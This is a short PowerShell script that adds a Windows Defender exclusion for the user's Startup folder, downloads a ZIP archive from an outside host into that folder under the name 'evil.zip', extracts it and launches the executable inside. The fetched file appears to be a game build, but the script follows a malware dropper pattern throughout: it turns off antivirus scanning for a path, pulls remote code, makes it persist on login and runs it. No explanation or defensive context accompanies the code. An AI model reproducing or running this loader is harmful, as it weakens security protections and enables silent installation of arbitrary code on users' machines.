Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"



$url = "https://ia800208.us.archive.org/29/items/Open_Sonic/OpenSonicWin.zip"
$destination = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.zip"
Invoke-WebRequest -Uri $url -OutFile $destination



#Extract the ZIP file:
$zipPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.zip"
$extractPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
Expand-Archive -Path $zipPath -DestinationPath $extractPath -F

#Run the EXE file:
$exePath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\opensonic.exe"
Start-Process -FilePath $exePath
